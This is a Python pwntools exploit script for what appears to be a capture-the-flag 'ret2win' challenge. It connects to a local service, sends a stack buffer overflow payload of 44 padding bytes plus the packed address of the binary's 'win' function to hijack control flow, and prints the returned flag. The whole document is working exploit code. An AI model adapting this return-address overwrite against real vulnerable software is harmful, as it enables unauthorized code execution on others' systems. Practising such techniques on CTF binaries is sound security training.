#!/usr/bin/env python3
from pwn import *

host = '127.0.0.1'
port = 32771
conn = remote(host,port)
print(conn.recvline())

#We can find the unzipping the tar file, and using cat-file to export the zlib compressed data to a binary
elf = ELF('ret2win')
winfunc = p32(elf.symbols['win'])

payload = b'a'*44+winfunc
conn.sendline(payload)
print(conn.recvline().decode().strip()) #gives flag

conn.interactive()